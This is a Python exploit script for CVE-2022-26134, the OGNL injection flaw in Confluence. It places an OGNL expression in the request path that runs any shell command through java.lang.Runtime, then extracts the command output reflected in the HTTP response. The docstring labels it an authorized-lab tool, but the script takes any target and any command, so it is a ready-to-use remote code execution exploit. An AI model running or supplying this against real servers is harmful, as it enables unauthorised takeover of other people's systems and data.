#!/usr/bin/env python3
"""CVE-2022-26134 (Confluence OGNL injection) - authorized-lab deploy.

Injects OGNL through the URI path (/.../<ognl>/...). The OGNL expression
runs a shell command via java.lang.Runtime and reads the process output back
with a Scanner, which Confluence reflects into the HTTP response, giving
direct command-execution proof with output.
"""
import argparse
import json
import random
import string
import sys
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def rand_str(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def build_ognl(command, marker):
    shell_cmd = "echo %s; %s; echo %s" % (marker, command, marker)
    ognl = ("${new java.util.Scanner(@java.lang.Runtime@getRuntime()"
            ".exec(new String[]{\"/bin/sh\",\"-c\",%s}).getInputStream())"
            ".useDelimiter(\"\\\\A\").next()}" % json.dumps(shell_cmd))
    return ognl


def run(args):
    base = "%s://%s:%d" % (args.scheme, args.target, args.port)
    result = {
        "cve": "CVE-2022-26134",
        "target": base,
        "vulnerable": False,
        "verified_by": None,
        "request_path": None,
        "response_excerpt": None,
        "command_output": None,
        "error": None,
    }
    marker = "ognl" + rand_str(8)
    ognl = build_ognl(args.command, marker)
    path = "/%s/" % quote(ognl, safe="")
    result["request_path"] = path

    try:
        r = requests.get(base + path, timeout=args.timeout, verify=False,
                         headers={"User-Agent": "Mozilla/5.0 QuantumLab"})
    except requests.exceptions.RequestException as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        return result

    # The OGNL result may be reflected in the body or in a redirect Location.
    carriers = [r.text]
    for resp in list(r.history) + [r]:
        loc = resp.headers.get("Location", "")
        carriers.append(loc)
    body = "\n".join(carriers)
    result["response_excerpt"] = r.text[:400]
    if marker in body:
        try:
            output = body.split(marker, 1)[1]
            output = output.rsplit(marker, 1)[0].strip()
        except ValueError:
            output = body
        result["command_output"] = output
        result["vulnerable"] = True
        result["verified_by"] = "OGNL injected via URI path; command output reflected in response"
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2022-26134 Confluence OGNL authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=8090)
    p.add_argument("--scheme", choices=["http", "https"], default="http")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--command", default="id; hostname", help="shell command (default: id; hostname)")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2022-26134", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
